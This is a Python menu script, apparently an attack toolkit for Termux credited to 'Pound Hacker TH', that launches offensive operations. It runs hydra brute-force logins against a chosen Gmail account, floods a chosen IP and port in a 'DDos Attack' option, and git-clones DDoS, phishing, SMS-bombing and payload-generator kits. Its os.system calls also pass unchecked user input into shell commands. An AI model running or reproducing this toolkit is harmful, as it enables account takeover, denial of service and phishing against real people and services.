#Import
import os, sys
import time

#Code Time
from time import sleep as timesleep

#Color :
class Color:
           GREEN = '\033[92m'
           YELLOW = '\033[93m'
           RED = '\033[91m'
           BLUE = '\033[96m'
           WHITE = '\033[97m'
####################################
def restart_program():
        python = sys.executable
        os.execl(python, python, * sys.argv)
        curdir = os.getcwd()

def Exit():
     os.system("clear")
     print(Color.GREEN + '''
#############################################################
###################################################   #######
###############################################   /~\   #####
############################################   _- `~~~', ####
##########################################  _-~       )  ####
#######################################  _-~          |  ####
####################################  _-~            ;  #####
##########################  __---___-~              |   #####
#######################   _~   ,,                  ;  `,,  ##
#####################  _-~    ;'                  |  ,'  ; ##
###################  _~      '                    `~'   ; ###
############   __---;                                 ,' ####
########   __~~  ___                                ,' ######
#####  _-~~   -~~ _                               ,' ########
##### `-_         _                              ; ##########
#######  ~~----~~~   ;                          ; ###########
#########  /          ;                        ; ############
#######  /             ;                      ; #############
#####  /                `                    ; ##############
###  / ''' + Color.BLUE + "   Create by Pound Hacker TH" + Color.GREEN + "         ; ###############")
     print(Color.GREEN + "#" + Color.BLUE + "                  THANK " + Color.GREEN + "                             #######")
     print("")
     timesleep(1)
     sys.exit()

def Error():
    print("")
    print(Color.RED  + " [~~~~~~~~~~~~~~~~~~~] ")
    print(Color.BLUE + " [~~~~~~Error~~~~~~~~] ")
    print(Color.RED  + " [~~~~~~~~~~~~~~~~~~~] ")
    timesleep(1)
    restart_program()
####################################

####################################
def Exiftool():
    os.system("clear")
    os.system("figlet ExifTool | lolcat")
    print(Color.RED  + "<~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~>")
    print(Color.BLUE + "<~~~~[คําเตือน] อย่าไปทําผิดกฎหมาย~~~~~~>")
    print(Color.BLUE + "<~~~~[ความสามารถ] ดูที่อยู่รูปภาพได้~~~~~~>")
    print(Color.BLUE + "<~~~~[วิธีใช้งาน] /sdcard/ชื่อรูปภาพ~~~~~>")
    print(Color.RED  + "<~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~>")
    print("")
    AddressImage = input(Color.RED + "[" + Color.WHITE + "AddressImage" + Color.RED + "]" + Color.BLUE + "•>> ")
    print("")
    os.system("exiftool %s | lolcat" % (AddressImage))
    print("")
    print(Color.RED + "       [" + Color.WHITE + "1" + Color.RED + "]" + Color.BLUE + "  Go Back Home P ")
    print("")
    print(Color.RED + "       [" + Color.WHITE + "0" + Color.RED + "]" + Color.BLUE + "  Exit The KOL ")
    print("")
    select = input(Color.RED + "[" + Color.WHITE + "~" + Color.RED + "]" + Color.BLUE + "•>> ")

    if select == "1" or select == "01":
       print("")
       print(Color.RED  + " [~~~~~~~~~~~~~~~~~~~~~~~~~~~~] ")
       print(Color.BLUE + " [~~~~~~Go Back Home P~~~~~~~~] ")
       print(Color.RED  + " [~~~~~~~~~~~~~~~~~~~~~~~~~~~~] ")
       timesleep(1)
       restart_program()

    elif select == "0" or select == "00":
       Exit()

    else:
       print("")
       print(Color.RED  + " [~~~~~~~~~~~~~~~~~~~] ")
       print(Color.BLUE + " [~~~~~~Error~~~~~~~~] ")
       print(Color.RED  + " [~~~~~~~~~~~~~~~~~~~] ")
       timesleep(1)
       Exiftool()
####################################

####################################
def BrueForce():
    os.system("clear")
    os.system("figlet BrueForce | lolcat")
    print("")
    print(Color.RED + "       [" + Color.WHITE + "1" + Color.RED + "]" + Color.BLUE + "  BrueForce Gmail   ")
    print("")
    print(Color.RED + "       [" + Color.WHITE + "2" + Color.RED + "]" + Color.BLUE + "  Go Back Home p ")
    print("")
    print(Color.RED + "       [" + Color.WHITE + "0" + Color.RED + "]" + Color.BLUE + "  Exit The KOL ")
    print("")
    select = input(Color.RED + "[" + Color.WHITE + "~" + Color.RED + "]" + Color.BLUE + "•>> ")

    if select == "1" or select == "01":
       os.system("clear")
       os.system("figlet GmailBrueForce | lolcat")
       print("")
       Email = input(Color.RED + "[" + Color.WHITE + "Email" + Color.RED + "]" + Color.BLUE + "•>> ")
       print("")
       Wordlist = input(Color.RED + "[" + Color.WHITE + "Wordlist" + Color.RED + "]" + Color.BLUE + "•>> ")
       print("")
       os.system("hydra -l %s -P %s -s 465 smtp.gmail.com smtp | lolcat" % (Email, Wordlist))
       print("")
       print(Color.RED + "       [" + Color.WHITE + "1" + Color.RED + "]" + Color.BLUE + "  Go Back Home P ")
       print("")
       print(Color.RED + "       [" + Color.WHITE + "0" + Color.RED + "]" + Color.BLUE + "  Exit The KOL ")
       print("")
       select = input(Color.RED + "[" + Color.WHITE + "~" + Color.RED + "]" + Color.BLUE + "•>> ")

       if select == "1" or select == "01":
          print("")
          print(Color.RED  + " [~~~~~~~~~~~~~~~~~~~~~~~~~~~~] ")
          print(Color.BLUE + " [~~~~~~Go Back Home P~~~~~~~~] ")
          print(Color.RED  + " [~~~~~~~~~~~~~~~~~~~~~~~~~~~~] ")
          timesleep(1)
          restart_program()

       elif select == "0" or select == "00":
          Exit()

       else:
          print("")
          print(Color.RED  + " [~~~~~~~~~~~~~~~~~~~] ")
          print(Color.BLUE + " [~~~~~~Error~~~~~~~~] ")
          print(Color.RED  + " [~~~~~~~~~~~~~~~~~~~] ")
          timesleep(1)
          BrueForce()

    elif select == "2" or select == "02":
          print("")
          print(Color.RED  + " [~~~~~~~~~~~~~~~~~~~~~~~~~~~~] ")
          print(Color.BLUE + " [~~~~~~Go Back Home P~~~~~~~~] ")
          print(Color.RED  + " [~~~~~~~~~~~~~~~~~~~~~~~~~~~~] ")
          timesleep(1)
          restart_program()

    elif select == "0" or select == "00":
          Exit()

    else:
          print("")
          print(Color.RED  + " [~~~~~~~~~~~~~~~~~~~] ")
          print(Color.BLUE + " [~~~~~~Error~~~~~~~~] ")
          print(Color.RED  + " [~~~~~~~~~~~~~~~~~~~] ")
          timesleep(1)
          BrueForce()

####################################

####################################
def Nmap():
    os.system("clear")
    os.system("figlet Nmap | lolcat")
    print("")
    IP = input(Color.RED + "[" + Color.WHITE + "IP" + Color.RED + "]" + Color.BLUE + "•>> ")
    os.system("clear")
    os.system("figlet Nmap | lolcat")
    print("")
    os.system("nmap %s | lolcat" % (IP))
    print("")
    print(Color.RED + "       [" + Color.WHITE + "1" + Color.RED + "]" + Color.BLUE + "  Go Back Home P ")
    print("")
    print(Color.RED + "       [" + Color.WHITE + "0" + Color.RED + "]" + Color.BLUE + "  Exit The KOL ")
    print("")
    select = input(Color.RED + "[" + Color.WHITE + "~" + Color.RED + "]" + Color.BLUE + "•>> ")

    if select == "1" or select == "01":
       print("")
       print(Color.RED  + " [~~~~~~~~~~~~~~~~~~~~~~~~~~~~] ")
       print(Color.BLUE + " [~~~~~~Go Back Home P~~~~~~~~] ")
       print(Color.RED  + " [~~~~~~~~~~~~~~~~~~~~~~~~~~~~] ")
       timesleep(1)
       restart_program()

    elif select == "0" or select == "00":
          Exit()

    else:
        print("")
        print(Color.RED  + " [~~~~~~~~~~~~~~~~~~~] ")
        print(Color.BLUE + " [~~~~~~Error~~~~~~~~] ")
        print(Color.RED  + " [~~~~~~~~~~~~~~~~~~~] ")
        timesleep(1)
        Nmap()
####################################

####################################
def DDosAttack():
    os.system("clear")
    os.system("figlet DDosAttack | lolcat")
    IP = input(Color.RED + "[" + Color.WHITE + "IP Address" + Color.RED + "]" + Color.BLUE + "•>> ")
    print("")
    Port = input(Color.RED + "[" + Color.WHITE + "Port" + Color.RED + "]" + Color.BLUE + "•>> ")
    print("")
    Packet = input(Color.RED + "[" + Color.WHITE + "Packet" + Color.RED + "]" + Color.BLUE + "•>> ")
    print("")
    os.system("python2 DDosAttack %s %s %s | lolcat" % (IP, Port, Packet))
    print("")
    print(Color.RED + "       [" + Color.WHITE + "1" + Color.RED + "]" + Color.BLUE + "  Go Back Home P ")
    print("")
    print(Color.RED + "       [" + Color.WHITE + "0" + Color.RED + "]" + Color.BLUE + "  Exit The KOL ")
    print("")
    select = input(Color.RED + "[" + Color.WHITE + "~" + Color.RED + "]" + Color.BLUE + "•>> ")

    if select == "1" or select == "01":
       print("")
       print(Color.RED  + " [~~~~~~~~~~~~~~~~~~~~~~~~~~~~] ")
       print(Color.BLUE + " [~~~~~~Go Back Home P~~~~~~~~] ")
       print(Color.RED  + " [~~~~~~~~~~~~~~~~~~~~~~~~~~~~] ")
       timesleep(1)
       restart_program()

    elif select == "0" or select == "00":
          Exit()

    else:
        print("")
        print(Color.RED  + " [~~~~~~~~~~~~~~~~~~~] ")
        print(Color.BLUE + " [~~~~~~Error~~~~~~~~] ")
        print(Color.RED  + " [~~~~~~~~~~~~~~~~~~~] ")
        timesleep(1)
        DDosAttack()
####################################

####################################
def InstallToolsHacking():
    os.system("clear")
    os.system("figlet InstallToolsHacking | lolcat")
    print("")
    print(Color.RED + "       [" + Color.WHITE + "1" + Color.RED + "]" + Color.BLUE + "  Show Tools   ")
    print("")
    print(Color.RED + "       [" + Color.WHITE + "2" + Color.RED + "]" + Color.BLUE + "  Go Back Home P ")
    print("")
    print(Color.RED + "       [" + Color.WHITE + "0" + Color.RED + "]" + Color.BLUE + "  Exit The KOL ")
    print("")
    select = input(Color.RED + "[" + Color.WHITE + "~" + Color.RED + "]" + Color.BLUE + "•>> ")

    if select == "1" or select == "01":
       print("")
       os.system("figlet Tools | lolcat")
       print("")
       print(Color.RED + "       [" + Color.WHITE + "1" + Color.RED + "]" + Color.BLUE + "  Planetwork-DDOS   ")
       print(Color.RED + "       [" + Color.WHITE + "2" + Color.RED + "]" + Color.BLUE + "  METASEC ")
       print(Color.RED + "       [" + Color.WHITE + "3" + Color.RED + "]" + Color.BLUE + "  HPAS1369 ")
       print(Color.RED + "       [" + Color.WHITE + "4" + Color.RED + "]" + Color.BLUE + "  TBomb ")
       print(Color.RED + "       [" + Color.WHITE + "5" + Color.RED + "]" + Color.BLUE + "  SocialSploit ")
       print(Color.RED + "       [" + Color.WHITE + "6" + Color.RED + "]" + Color.BLUE + "  WishFish ")
       print(Color.RED + "       [" + Color.WHITE + "7" + Color.RED + "]" + Color.BLUE + "  XTRACK ")
       print(Color.RED + "       [" + Color.WHITE + "8" + Color.RED + "]" + Color.BLUE + "  Paygen ")
       print(Color.RED + "       [" + Color.WHITE + "9" + Color.RED + "]" + Color.BLUE + "  Zphisher ")
       print(Color.RED + "       [" + Color.WHITE + "10" + Color.RED + "]" + Color.BLUE + " DDos-Attack ")
       print(Color.RED + "       [" + Color.WHITE + "11" + Color.RED + "]" + Color.BLUE + " DDos ")
       print("")
       print(Color.RED + "       [" + Color.WHITE + "12" + Color.RED + "]" + Color.BLUE + "  Go Back Home P ")
       print("")
       print(Color.RED + "       [" + Color.WHITE + "00" + Color.RED + "]" + Color.BLUE + "  Exit The KOL ")
       print("")
       select = input(Color.RED + "[" + Color.WHITE + "~" + Color.RED + "]" + Color.BLUE + "•>> ")

       if select == "1" or select == "01":
          os.system("clear")
          os.system("figlet Planetwork-DDOS | lolcat")
          print("")
          os.system("pkg install git -y | lolcat")
          os.system("git clone https://github.com/Hydra7/Planetwork-DDOS | lolcat")
          os.system("mv Planetwork-DDOS $HOME")
          print("")
          print(Color.BLUE + " are Tools Page P ")
          print("")

       elif select == "2" or select == "02":
          os.system("clear")
          os.system("figlet METASEC | lolcat")
          print("")
          os.system("pkg install unstable-repo -y | lolcat")
          os.system("pkg install metasploit -y | lolcat")
          os.system("pkg install python2 -y | lolcat")
          os.system("pkg install git -y | lolcat")
          os.system("git clone https://github.com/malw4r3/METASEC | lolcat")
          os.system("mv METASEC $HOME")
          print("")
          print(Color.BLUE + " are Tools Page P ")
          print("")

       elif select == "3" or select == "03":
         os.system("clear")
         os.system("figlet HPAS1369 | lolcat")
         print("")
         os.system("pkg install git -y | lolcat")
         os.system("git clone https://github.com/DedSecCyber/HPAS1369 | lolcat")
         os.system("mv HPAS1369 $HOME")
         print("")
         print(Color.BLUE + " are Tools Page P ")
         print("")

       elif select == "4" or select == "04":
         os.system("clear")
         os.system("figlet TBomb | lolcat")
         print("")
         os.system("pkg install git -y | lolcat")
         os.system("git clone https://github.com/TheSpeedX/TBomb | lolcat")
         os.system("mv TBomb $HOME")
         print("")
         print(Color.BLUE + " are Tools Page P ")
         print("")

       elif select == "5" or select == "05":
         os.system("clear")
         os.system("figlet SocialSploit | lolcat")
         print("")
         os.system("pkg install git -y | lolcat")
         os.system("git clone https://github.com/Cesar-Hack-Gray/SocialSploit | lolcat")
         os.system("mv SocialSploit $HOME")
         print("")
         print(Color.BLUE + " are Tools Page P ")
         print("")

       elif select == "6" or select == "06":
         os.system("clear")
         os.system("figlet WishFish | lolcat")
         print("")
         os.system("pkg install php -y | lolcat")
         os.system("pkg install openssh -y | lolcat")
         os.system("pkg install wget -y | lolcat")
         os.system("git clone https://github.com/kinghacker0/WishFish | lolcat")
         os.system("mv WishFish $HOME ")
         print("")
         print(Color.BLUE + " are Tools Page P ")
         print("")

       elif select == "7" or select == "07":
         os.system("clear")
         os.system("figlet XTRACK | lolcat")
         print("")
         os.system("pkg install git -y | lolcat")
         os.system("git clone https://github.com/MALW4R3/XTRACK | lolcat")
         os.system("mv XTRACK $HOME")
         print("")
         print(Color.BLUE + " are Tools Page P ")
         print("")

       elif select == "8" or select == "08":
         os.system("clear")
         os.system("figlet Paygen | lolcat")
         print("")
         os.system("pkg update -y | lolcat")
         os.system("pkg install git -y | lolcat")
         os.system("git clone https://github.com/shadowwalker005/paygen | lolcat")
         os.system("mv paygen $HOME")
         print("")
         print(Color.BLUE + " are Tools Page P ")
         print("")

       elif select == "9" or select == "09":
         os.system("clear")
         os.system("figlet Zphisher | lolcat")
         print("")
         os.system("apt update -y | lolcat")
         os.system("apt install git curl php wget -y | lolcat")
         os.system("git clone https://github.com/htr-tech/zphisher | lolcat")
         os.system("mv zphisher $HOME")
         print("")
         print(Color.BLUE + " are Tools Page P ")
         print("")

       elif select == "10":
         os.system("clear")
         os.system("figlet DDos-Attack | lolcat")
         print("")
         os.system("pkg install git -y | lolcat")
         os.system("git clone https://github.com/Ha3MrX/DDos-Attack | lolcat")
         os.system("mv DDos-Attack $HOME")
         print("")
         print(Color.BLUE + " are Tools Page P ")
         print("")

       elif select == "11":
         os.system("clear")
         os.system("figlet DDos | lolcat")
         print("")
         os.system("pkg install git -y | lolcat")
         os.system("git clone https://github.com/Bell-A-7KA/DDos | lolcat")
         os.system("mv DDos $HOME")
         print("")
         print(Color.BLUE + " are Tools Page P ")
         print("")

       elif select == "12":
         print("")
         print(Color.RED  + " [~~~~~~~~~~~~~~~~~~~~~~~~~~~~] ")
         print(Color.BLUE + " [~~~~~~Go Back Home P~~~~~~~~] ")
         print(Color.RED  + " [~~~~~~~~~~~~~~~~~~~~~~~~~~~~] ")
         timesleep(1)
         restart_program()

       elif select == "0" or select == "00":
           Exit()

       else:
           print("")
           print(Color.RED  + " [~~~~~~~~~~~~~~~~~~~] ")
           print(Color.BLUE + " [~~~~~~Error~~~~~~~~] ")
           print(Color.RED  + " [~~~~~~~~~~~~~~~~~~~] ")
           timesleep(1)
           InstallToolsHacking()

    if select == "2" or select == "02":
       print("")
       print(Color.RED  + " [~~~~~~~~~~~~~~~~~~~~~~~~~~~~] ")
       print(Color.BLUE + " [~~~~~~Go Back Home P~~~~~~~~] ")
       print(Color.RED  + " [~~~~~~~~~~~~~~~~~~~~~~~~~~~~] ")
       timesleep(1)
       restart_program()

    elif select == "0" or select == "00":
          Exit()

    else:
        print("")
        print(Color.RED  + " [~~~~~~~~~~~~~~~~~~~] ")
        print(Color.BLUE + " [~~~~~~Error~~~~~~~~] ")
        print(Color.RED  + " [~~~~~~~~~~~~~~~~~~~] ")
        timesleep(1)
        InstallToolsHacking()
####################################
os.system("clear")
print(Color.RED + '''
 /$$   /$$           /$$
| $$  /$$/          | $$
| $$ /$$/   /$$$$$$ | $$
| $$$$$/   /$$__  $$| $$
| $$  $$  | $$  \ $$| $$
| $$\  $$ | $$  | $$| $$
| $$ \  $$|  $$$$$$/| $$
|__/  \__/ \______/ |__/ ''' + Color.BLUE + "Create by Pound Hacker TH")
print("")
print(Color.RED +  "<~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~>")
print(Color.BLUE + "<~~[Author] : Pound Hacker TH~~>")
print(Color.BLUE + "<~~[Group]  : PlusX HK~~~~~~~~~>")
print(Color.BLUE + "<~~[Version]: 1.0~~~~~~~~~~~~~~>")
print(Color.RED +  "<~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~>")
print("")
print(Color.RED + "       [" + Color.WHITE + "1" + Color.RED + "]" + Color.BLUE + "  EXIFTOOL   ")
print(Color.RED + "       [" + Color.WHITE + "2" + Color.RED + "]" + Color.BLUE + "  Brue Force ")
print(Color.RED + "       [" + Color.WHITE + "3" + Color.RED + "]" + Color.BLUE + "  NMAP ")
print(Color.RED + "       [" + Color.WHITE + "4" + Color.RED + "]" + Color.BLUE + "  DDos Attack ")
print(Color.RED + "       [" + Color.WHITE + "5" + Color.RED + "]" + Color.BLUE + "  Install Tools Hacking ") 
print("")
print(Color.RED + "       [" + Color.WHITE + "0" + Color.RED + "]" + Color.BLUE + "  Exit The KOL ")
print("")
select = input(Color.RED + "[" + Color.WHITE + "~" + Color.RED + "]" + Color.BLUE + "•>> ")

if select == "1" or select == "01":
   print("")
   print(Color.RED  + " [~~~~~~~~~~~~~~~~~~~] ")
   print(Color.BLUE + " [~~~~~~ExifTool~~~~~] ")
   print(Color.RED  + " [~~~~~~~~~~~~~~~~~~~] ")
   timesleep(1)
   Exiftool()

elif select == "2" or select == "02":
   print("")
   print(Color.RED  + " [~~~~~~~~~~~~~~~~~~~] ")
   print(Color.BLUE + " [~~~~Brue Force~~~~~] ")
   print(Color.RED  + " [~~~~~~~~~~~~~~~~~~~] ")
   timesleep(1)
   BrueForce()

elif select == "3" or select == "03":
   print("")
   print(Color.RED  + " [~~~~~~~~~~~~~~~~~~~] ")
   print(Color.BLUE + " [~~~~~~~Nmap~~~~~~~~] ")
   print(Color.RED  + " [~~~~~~~~~~~~~~~~~~~] ")
   timesleep(1)
   Nmap()

elif select == "4" or select == "04":
   print("")
   print(Color.RED  + " [~~~~~~~~~~~~~~~~~~~] ")
   print(Color.BLUE + " [~~~~DDos Attack~~~~] ")
   print(Color.RED  + " [~~~~~~~~~~~~~~~~~~~] ")
   timesleep(1)
   DDosAttack()

elif select == "5" or select == "05":
   print("")
   print(Color.RED  + " [~~~~~~~~~~~~~~~~~~~~~~~~~~~~~] ")
   print(Color.BLUE + " [~~~~Install Tools Hacking~~~~] ")
   print(Color.RED  + " [~~~~~~~~~~~~~~~~~~~~~~~~~~~~~] ")
   timesleep(1)
   InstallToolsHacking()

elif select == "0" or select == "00":
   Exit()

else:
   Error()
